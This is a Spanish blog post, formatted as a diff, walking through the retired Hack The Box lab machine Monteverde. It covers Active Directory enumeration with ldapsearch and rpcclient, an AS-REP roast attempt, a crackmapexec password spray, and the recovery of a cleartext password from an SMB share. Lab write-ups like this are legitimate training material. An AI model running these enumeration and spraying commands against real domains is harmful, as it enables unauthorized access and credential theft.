@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Retirada Monteverde AD de Hack The Box (Necesario VIP) | Pirrandi Blog</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Maquina Retirada Monteverde AD de Hack The Box (Necesario VIP)" />
+<meta name="author" content="Pirrandi" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada MonteVerde AD" />
+<meta property="og:description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada MonteVerde AD" />
+<link rel="canonical" href="http://localhost:4000/2022/03/05/Monteverde.html" />
+<meta property="og:url" content="http://localhost:4000/2022/03/05/Monteverde.html" />
+<meta property="og:site_name" content="Pirrandi Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-03-05T00:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Maquina Retirada Monteverde AD de Hack The Box (Necesario VIP)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Pirrandi"},"dateModified":"2022-03-05T00:00:00-03:00","datePublished":"2022-03-05T00:00:00-03:00","description":"En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada MonteVerde AD","headline":"Maquina Retirada Monteverde AD de Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/03/05/Monteverde.html"},"url":"http://localhost:4000/2022/03/05/Monteverde.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Pirrandi Blog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pirrandi Blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="" class="author-avatar" alt="Avatar" />
+    
+Este es mi blog personal sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Maquina Retirada Monteverde AD de Hack The Box (Necesario VIP)</h1>
+  
+  <div class="post-tags">
+     
+      <a class="tag" href="/tag/HTB,/">HTB,</a>
+      
+      <a class="tag" href="/tag/LDAP,/">LDAP,</a>
+      
+      <a class="tag" href="/tag/RPCCLIENT,/">RPCCLIENT,</a>
+      
+      <a class="tag" href="/tag/ASREPRoast/">ASREPRoast</a>
+      
+      <a class="tag" href="/tag/Attack,/">Attack,</a>
+      
+      <a class="tag" href="/tag/Crackmapexec,/">Crackmapexec,</a>
+      
+      <a class="tag" href="/tag/Azure/">Azure</a>
+      
+      <a class="tag" href="/tag/Admins/">Admins</a>
+      
+      <a class="tag" href="/tag/Group,/">Group,</a>
+      
+      <a class="tag" href="/tag/Privesc/">Privesc</a>
+      
+      <a class="tag" href="/tag/Azure/">Azure</a>
+      
+      <a class="tag" href="/tag/Admins,/">Admins,</a>
+      
+      <a class="tag" href="/tag/Evil-WinRm,/">Evil-WinRm,</a>
+      
+      <a class="tag" href="/tag/Maquinas/">Maquinas</a>
+      
+      <a class="tag" href="/tag/Retiradas/">Retiradas</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 05 Mar 2022</div>
+  
+  <noscript>
+    <div class="post-description">En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada MonteVerde AD</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h1 id="cascade---ad-path--hack-the-box">Cascade - AD Path ~ Hack The Box</h1>
+
+<p>Realizamos el Primer escaneo con Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2022-04-28 14:24:27Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49696/tcp open  msrpc         Microsoft Windows RPC
+61610/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: MONTEVERDE<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   <span class="nb">date</span>: 2022-04-28T14:25:17
+|_  start_date: N/A
+|_clock-skew: 5m45s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+</code></pre></div></div>
+
+<p>Procedemos a enumerar el puerto 389 o servicio de Ldap</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ldapsearch -x -h 10.10.10.172 -b 'DC=MEGABANK,DC=LOCAL'   → para enumerar users</span>
+<span class="c"># ldapsearch -x -h 10.10.10.172 -b 'DC=MEGABANK,DC=LOCAL' | grep "userPrincipalName" | awk '{print $2}' | tr '@' ' ' | awk '{print $1}' </span>
+ 
+mhope
+SABatchJobs                                                 
+svc-ata                                
+svc-bexec                              
+svc-netapp                                                                                               
+dgalanos                               
+roleary                                
+smorgan 
+</code></pre></div></div>
+
+<p>Procedemos a usar la herramienta RPCCLIENT para seguir enumerando</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># rpcclient -U '' 10.10.10.172 -N </span>
+
+rpcclient <span class="nv">$&gt;</span> <span class="s2">"enumdomusers "</span>                                                                                                                                           
+user:[Guest] rid:[0x1f5]
+user:[AAD_987d7f2f57d2] rid:[0x450]                 
+user:[mhope] rid:[0x641]               
+user:[SABatchJobs] rid:[0xa2a]            
+user:[svc-ata] rid:[0xa2b]             
+user:[svc-bexec] rid:[0xa2c]                   
+user:[svc-netapp] rid:[0xa2d]                                        
+user:[dgalanos] rid:[0xa35]            
+user:[roleary] rid:[0xa36]                    
+user:[smorgan] rid:[0xa37]    
+                                                                                                                                                                                     
+rpcclient <span class="nv">$&gt;</span><span class="s2">" enumdomgroups "</span>                                
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Users] rid:[0x201]       
+group:[Domain Guests] rid:[0x202]                         
+group:[Domain Computers] rid:0x203]                                                                                                                                  
+group:[Group Policy Creator Owners] rid:[0x208]                                           
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[DnsUpdateProxy] rid:[0x44e]                                                                                                                  
+group:[Azure Admins] rid:[0xa29]                                                                                         
+group:[File Server Admins] rid:[0xa2e]                                                          
+group:[Call Recording Admins] rid:[0xa2f]                        
+group:[Reception] rid:[0xa30]          
+group:[Operations] rid:[0xa31]                                     
+group:[Trading] rid:[0xa32]                 
+group:[HelpDesk] rid:[0xa33]                  
+group:[Developers] rid:[0xa34]  
+
+Listamos usuarios para el grupo de Azure Admins:
+rpcclient <span class="nv">$&gt;</span><span class="s2">" querygroupmem 0xa29 "</span>      
+         rid:[0x1f4] attr:[0x7]                  
+        rid:[0x450] attr:[0x7]                 
+        rid:[0x641] attr:[0x7]
+        
+</code></pre></div></div>
+
+<p>Enumeramos que usuarios pertenecen al grupo Azure Admins ( el Grupo Mas Interesante ):</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> queryuser 0x1f4                                                                                                                                                                               <span class="o">[</span>9/1813]
+result was NT_STATUS_ACCESS_DENIED     
+                                                                                                                                                                            
+rpcclient <span class="nv">$&gt;</span> <span class="s2">"queryuser 0x450   "</span>     
+        User Name   :   AAD_987d7f2f57d2       
+        Full Name   :   AAD_987d7f2f57d2       
+        Home Drive  :                          
+        Dir Drive   :                          
+        Profile Path:                         
+        Logon Script:
+        Description :   Service account <span class="k">for </span>the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
+        Workstations:
+        Comment     :
+        Remote Dial :
+        Logon Time               :      jue, 28 abr 2022 16:15:33 CEST
+        Logoff Time              :      jue, 01 ene 1970 01:00:00 CET
+        Kickoff Time             :      jue, 01 ene 1970 01:00:00 CET
+        Password last <span class="nb">set </span>Time   :      jue, 02 ene 2020 23:53:25 CET
+        Password can change Time :      vie, 03 ene 2020 23:53:25 CET
+        Password must change Time:      jue, 14 sep 30828 04:48:05 CEST
+        unknown_2[0..31]...
+        user_rid :      0x450
+        group_rid:      0x201
+        acb_info :      0x00000210
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x0000000a
+        padding1[0..7]...
+        logon_hrs[0..21]...
+
+rpcclient <span class="nv">$&gt;</span> <span class="s2">"queryuser 0x641"</span>
+        User Name   :  <span class="s2">" mhope"</span>
+        Full Name   :   Mike Hope
+        Home Drive  :   <span class="se">\\</span>monteverde<span class="se">\u</span>sers<span class="nv">$\</span>mhope
+        Dir Drive   :   H:
+        Profile Path:
+        Logon Script:
+        Description :
+        Workstations:
+        Comment     :
+        Remote Dial :
+        Logon Time               :      vie, 03 ene 2020 14:29:59 CET
+        Logoff Time              :      jue, 01 ene 1970 01:00:00 CET
+        Kickoff Time             :      jue, 14 sep 30828 04:48:05 CEST
+        Password last <span class="nb">set </span>Time   :      vie, 03 ene 2020 00:40:06 CET
+        Password can change Time :      sáb, 04 ene 2020 00:40:06 CET
+        Password must change Time:      jue, 14 sep 30828 04:48:05 CEST
+        unknown_2[0..31]...
+        user_rid :      0x641
+        group_rid:      0x201
+        acb_info :      0x00000210
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x00000002
+        padding1[0..7]...
+        logon_hrs[0..21]...
+rpcclient <span class="nv">$&gt;</span> <span class="nb">exit</span>
+</code></pre></div></div>
+
+<p>Enumeramos mas Usuarios para nuestro diccionario de Usuarios</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># rpcclient -U '' 10.10.10.172 -N -c 'enumdomusers' | grep -oP "\[.*?\]" | tr '[]' ' ' | grep -v 0x  </span>
+ Guest 
+ AAD_987d7f2f57d2 
+ mhope 
+ SABatchJobs 
+ svc-ata 
+ svc-bexec 
+ svc-netapp 
+ dgalanos 
+ roleary 
+ smorgan 
+ 
+<span class="s2">"Los añadimos a nuestro potencial listado de usuarios de  AD ---&gt; users.txt "</span>
+</code></pre></div></div>
+
+<p>Procedemos a hacer una ASPREPROAST ATTACK</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># GetNPUsers.py megabank.local/ -no-pass -usersfile users.txt        </span>
+Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation
+
+<span class="o">[</span>-] User mhope doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User SABatchJobs doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User svc-ata doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc-bexec doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User svc-netapp doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User dgalanos doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User roleary doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User smorgan doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span class="o">(</span>Clients credentials have been revoked<span class="o">)</span>
+<span class="o">[</span>-] User AAD_987d7f2f57d2 doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User mhope doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User SABatchJobs doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc-ata doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User svc-bexec doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc-netapp doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User dgalanos doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User roleary doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User smorgan doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+
+No funciona
+</span></code></pre></div></div>
+<p>Probamos a Realizar un ataque de Password Spray con Crackmapexec usando porque no como PASSWORDS el mismo listado de Users</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># crackmapexec smb 10.10.10.172 -u users.txt -p users.txt   </span>
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:roleary STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:smorgan STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:roleary STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:smorgan STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE     <span class="s2">"  [+] MEGABANK.LOCAL</span><span class="se">\S</span><span class="s2">ABatchJobs:SABatchJobs    "</span>
+</code></pre></div></div>
+
+<p>Probamos a listar recursos compartidos por SMB para este usuario</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs'     </span>
+<span class="o">[</span>+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>                                                 NO ACCESS       Remote Admin
+        azure_uploads                                           READ ONLY
+        C<span class="nv">$ </span>                                                     NO ACCESS       Default share
+        E<span class="nv">$ </span>                                                     NO ACCESS       Default share
+        IPC<span class="nv">$ </span>                                                   READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+        <span class="nb">users</span><span class="nv">$ </span>                                                 READ ONLY
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'azure_uploads' </span>
+<span class="o">[</span>+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        azure_uploads                                           READ ONLY
+        .<span class="se">\a</span>zure_uploads<span class="se">\*</span>
+        dr--r--r--                0 Fri Jan  3 13:43:36 2020    <span class="nb">.</span>
+        dr--r--r--                0 Fri Jan  3 13:43:36 2020    ..
+        
+<span class="c"># smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'IPC$'                                                                                                                                         1 ⚙</span>
+<span class="o">[</span>+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        IPC<span class="nv">$ </span>                                                   READ ONLY
+        .<span class="se">\I</span>PC<span class="nv">$\</span><span class="k">*</span>
+        fr--r--r--                3 Sun Dec 31 23:45:16 1600    InitShutdown
+        fr--r--r--                4 Sun Dec 31 23:45:16 1600    lsass
+        fr--r--r--                3 Sun Dec 31 23:45:16 1600    ntsvcs
+        fr--r--r--                3 Sun Dec 31 23:45:16 1600    scerpc
+        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2<span class="se">\C</span>atalogChangeListener-378-0
+        fr--r--r--                3 Sun Dec 31 23:45:16 1600    epmapper
+        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2<span class="se">\C</span>atalogChangeListener-1d4-0
+        fr--r--r--                3 Sun Dec 31 23:45:16 1600    LSM_API_service
+        fr--r--r--                3 Sun Dec 31 23:45:16 1600    eventlog
+        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2<span class="se">\C</span>atalogChangeListener-47c-0
+        fr--r--r--                3 Sun Dec 31 23:45:16 1600    atsvc
+        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2<span class="se">\C</span>atalogChangeListener-62c-0
+        fr--r--r--                4 Sun Dec 31 23:45:16 1600    wkssvc
+        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2<span class="se">\C</span>atalogChangeListener-26c-0
+        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2<span class="se">\C</span>atalogChangeListener-26c-1
+        fr--r--r--                3 Sun Dec 31 23:45:16 1600    RpcProxy<span class="se">\4</span>9673
+        fr--r--r--                3 Sun Dec 31 23:45:16 1600    f9f9dd07a1a076b9
+        fr--r--r--                3 Sun Dec 31 23:45:16 1600    RpcProxy<span class="se">\5</span>93
+        fr--r--r--                4 Sun Dec 31 23:45:16 1600    srvsvc
+        fr--r--r--                3 Sun Dec 31 23:45:16 1600    spoolss
+        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2<span class="se">\C</span>atalogChangeListener-abc-0
+        fr--r--r--                3 Sun Dec 31 23:45:16 1600    netdfs
+        fr--r--r--                1 Sun Dec 31 23:45:16 1600    vgauth-service
+        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2<span class="se">\C</span>atalogChangeListener-264-0
+        fr--r--r--                3 Sun Dec 31 23:45:16 1600    SQLLocal<span class="se">\M</span>SSQLSERVER
+        fr--r--r--                2 Sun Dec 31 23:45:16 1600    sql<span class="se">\q</span>uery
+        fr--r--r--                3 Sun Dec 31 23:45:16 1600    W32TIME_ALT
+        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2<span class="se">\C</span>atalogChangeListener-b24-0
+        fr--r--r--                1 Sun Dec 31 23:45:16 1600    PIPE_EVENTROOT<span class="se">\C</span>IMV2SCM EVENT PROVIDER
+        fr--r--r--                1 Sun Dec 31 23:45:16 1600    CPFATP_3900_v4.0.30319
+        fr--r--r--                1 Sun Dec 31 23:45:16 1600    PSHost.132956289328053743.3900.DefaultAppDomain.miiserver
+        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2<span class="se">\C</span>atalogChangeListener-b14-0
+        
+<span class="c"># smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'users$'                                        </span>
+<span class="o">[</span>+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        <span class="nb">users</span><span class="nv">$ </span>                                                 READ ONLY
+        .<span class="se">\u</span>sers<span class="nv">$\</span><span class="k">*</span>
+        dr--r--r--                0 Fri Jan  3 14:12:48 2020    <span class="nb">.</span>
+        dr--r--r--                0 Fri Jan  3 14:12:48 2020    ..
+        dr--r--r--                0 Fri Jan  3 14:15:23 2020    dgalanos
+        dr--r--r--                0 Fri Jan  3 14:41:18 2020    mhope
+        dr--r--r--                0 Fri Jan  3 14:14:56 2020    roleary
+        dr--r--r--                0 Fri Jan  3 14:14:28 2020    smorgan
+
+<span class="c"># smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'SYSVOL'                                             </span>
+<span class="o">[</span>+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        SYSVOL                                                  READ ONLY
+        .<span class="se">\S</span>YSVOL<span class="se">\*</span>
+        dr--r--r--                0 Thu Jan  2 23:05:27 2020    <span class="nb">.</span>
+        dr--r--r--                0 Thu Jan  2 23:05:27 2020    ..
+        dr--r--r--                0 Thu Jan  2 23:05:27 2020    MEGABANK.LOCAL
+        
+<span class="c"># smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'NETLOGON'                                      </span>
+<span class="o">[</span>+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        NETLOGON                                                READ ONLY
+        .<span class="se">\N</span>ETLOGON<span class="se">\*</span>
+        dr--r--r--                0 Thu Jan  2 23:05:27 2020    <span class="nb">.</span>
+        dr--r--r--                0 Thu Jan  2 23:05:27 2020    ..
+        
+<span class="c"># smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'users$/mhope'                         </span>
+<span class="o">[</span>+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        <span class="nb">users</span><span class="nv">$ </span>                                                 READ ONLY
+        .<span class="se">\u</span>sers<span class="nv">$mhope</span><span class="se">\*</span>
+        dr--r--r--                0 Fri Jan  3 14:41:18 2020    <span class="nb">.</span>
+        dr--r--r--                0 Fri Jan  3 14:41:18 2020    ..
+        fw--w--w--             1212 Fri Jan  3 15:59:24 2020    azure.xml
+</code></pre></div></div>
+
+<p>Descargamos el archivo interesante a nuestro pc</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --download 'users$/mhope/azure.xml'   </span>
+<span class="o">[</span>+] Starting download: <span class="nb">users</span><span class="nv">$\</span>mhope<span class="se">\a</span>zure.xml <span class="o">(</span>1212 bytes<span class="o">)</span>                                                                                                                                                         
+<span class="o">[</span>+] File output to: /home/pro/Escritorio/HTB/Monteverde/nmap/10.10.10.172-users_mhope_azure.xml
+</code></pre></div></div>
+
+<p>Lo leemos</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat mhope-azure.xml                                                                                                                                                                                        1 ⚙ </span>
+&lt;Objs <span class="nv">Version</span><span class="o">=</span><span class="s2">"1.1.0.1"</span> <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/powershell/2004/04"</span><span class="o">&gt;</span>                                                                                                                                   
+  &lt;Obj <span class="nv">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>
+    &lt;TN <span class="nv">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>
+      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;
+      &lt;T&gt;System.Object&lt;/T&gt;
+    &lt;/TN&gt;
+    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;
+    &lt;Props&gt;
+      &lt;DT <span class="nv">N</span><span class="o">=</span><span class="s2">"StartDate"</span><span class="o">&gt;</span>2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+      &lt;DT <span class="nv">N</span><span class="o">=</span><span class="s2">"EndDate"</span><span class="o">&gt;</span>2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+      &lt;G <span class="nv">N</span><span class="o">=</span><span class="s2">"KeyId"</span><span class="o">&gt;</span>00000000-0000-0000-0000-000000000000&lt;/G&gt;
+      &lt;S <span class="nv">N</span><span class="o">=</span><span class="s2">"Password"</span><span class="o">&gt;</span>4n0therD4y@n0th3r<span class="nv">$&lt;</span>/S&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;    
+</code></pre></div></div>
+<p>Encontramos una credenciales para mhope</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.172 <span class="nt">-u</span> mhope <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span>                                                                                                                                             1 ⚙
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\m</span>hope:4n0therD4y@n0th3r<span class="nv">$ </span>
+
